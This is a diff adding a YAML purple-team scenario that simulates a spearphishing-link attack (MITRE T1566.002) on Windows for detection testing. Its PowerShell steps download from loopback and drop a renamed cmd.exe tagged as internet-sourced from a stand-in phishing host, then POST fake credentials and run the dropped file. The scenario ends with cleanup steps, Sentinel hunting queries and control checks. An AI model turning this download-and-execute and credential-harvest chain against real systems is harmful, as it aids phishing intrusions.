@@ -1,0 +1,122 @@
+id: T1566.002_spearphishing_link
+name: "Phishing — Spearphishing Link"
+mitre_technique: "T1566.002"
+mitre_tactic: "initial_access"
+description: >
+  Adversaries send emails containing malicious links that redirect to credential
+  harvesting pages, payload download sites, or adversary-controlled infrastructure.
+  Unlike attachment-based phishing, the payload is fetched at click time — bypassing
+  email gateway attachment scanning. Defender for Office 365 Safe Links rewrites URLs
+  and detonates them at click time. This scenario simulates the click-and-download
+  chain that a malicious link produces on the host, and validates Safe Links coverage.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1566/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1566.002 — Spearphishing Link simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate browser-initiated download from phishing link — loopback only"
+    command: |
+      Write-Host "[PAS] Simulating malicious link click → download chain:"
+      Write-Host "[PAS] Real attack: victim clicks link -> redirected -> payload downloaded"
+
+      # Simulate Invoke-WebRequest to loopback (safe — no external traffic)
+      $downloadPath = "$env:TEMP\PAS_T1566_002_update.exe"
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/PAS_T1566_002_payload.exe" `
+              -OutFile $downloadPath -TimeoutSec 2 -ErrorAction SilentlyContinue
+      } catch {}
+
+      # Drop the file directly (simulates what a successful download would produce)
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" $downloadPath -Force
+      Set-Content "$downloadPath`:Zone.Identifier" `
+          "[ZoneTransfer]`nZoneId=3`nHostUrl=http://phishing.example.com/update.exe"
+      Write-Host "[PAS] Downloaded payload simulated: $downloadPath (ZoneId=3, Internet)"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate OAuth phishing — browser navigating to consent URL"
+    command: |
+      Write-Host "[PAS] OAuth/consent phishing simulation:"
+      Write-Host "[PAS] Real attack: link leads to fake Microsoft login or OAuth consent page"
+      Write-Host "[PAS] Victim grants permissions to malicious app — no malware needed"
+      Write-Host "[PAS] OAuth token theft artifacts: new app consent in Entra ID audit log"
+
+      # Generate a browser process network event to a phishing-like URL (loopback)
+      $proc = Start-Process msedge.exe `
+          -ArgumentList "--headless http://127.0.0.1/?client_id=PAS_T1566_002_oauth" `
+          -PassThru -ErrorAction SilentlyContinue
+      Start-Sleep -Milliseconds 500
+      if ($proc -and !$proc.HasExited) {
+          $proc | Stop-Process -Force -ErrorAction SilentlyContinue
+      }
+      Write-Host "[PAS] Browser navigation to OAuth URL simulated"
+
+  - step: 4
+    type: exec_powershell
+    description: "Simulate credential harvesting — browser POST to phishing page"
+    command: |
+      Write-Host "[PAS] Credential harvesting simulation (loopback POST):"
+      try {
+          Invoke-WebRequest -Uri "http://127.0.0.1/PAS_T1566_002_harvest" `
+              -Method POST `
+              -Body "username=victim@company.com&password=PAS_SIMULATED" `
+              -TimeoutSec 2 -ErrorAction SilentlyContinue | Out-Null
+      } catch {}
+      Write-Host "[PAS] HTTP POST to phishing URL executed (loopback — no real credentials sent)"
+      Write-Host "[PAS] Real detection: MDE network event for browser POST to unknown domain"
+
+  - step: 5
+    type: exec_powershell
+    description: "Execute the simulated downloaded payload — validates post-download execution detection"
+    command: |
+      $downloadPath = "$env:TEMP\PAS_T1566_002_update.exe"
+      if (Test-Path $downloadPath) {
+          Write-Host "[PAS] Executing downloaded payload (Zone.Identifier = Internet):"
+          Start-Process $downloadPath -ArgumentList "/c echo PAS-T1566.002-LINK-EXEC" `
+              -Wait -NoNewWindow
+          Write-Host "[PAS] Internet-sourced executable ran — SmartScreen should have blocked this"
+      }
+
+  - step: 6
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 7
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — browser downloading .exe with Zone.Identifier 3, execution of internet-sourced binary"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove phishing link simulation artifacts"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1566_002_update.exe" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Spearphishing link artifacts removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1566.002 cleanup complete"
+
+analyst_checklist:
+  - "Network event: browser downloading .exe, .dll, .js, .ps1 from external URL"
+  - "File event: executable created in Downloads/TEMP with Zone.Identifier ZoneId=3"
+  - "Process event: executable with ZoneId=3 Zone.Identifier being executed"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName in ('msedge.exe','chrome.exe') and RemoteUrl matches regex @'\\.(exe|dll|ps1|js|hta)$'"
+  - "Sentinel: DeviceFileEvents | where FileName endswith '.exe' and FolderPath contains 'Downloads' and ActionType == 'FileCreated'"
+  - "MDE alert: 'Downloaded executable from phishing URL' or 'SmartScreen blocked execution'"
+  - "CONTROL CHECK: Defender for Office 365 Safe Links must be enabled — rewrites URLs and detonates at click time"
+  - "CONTROL CHECK: SmartScreen must be enabled — blocks execution of unknown internet-sourced executables"
+  - "CONTROL CHECK: Entra ID — monitor OAuth app consent grants for new third-party applications"
+  - "CONTROL CHECK: Defender for Cloud Apps — alert on first-time OAuth consent for apps from untrusted publishers"
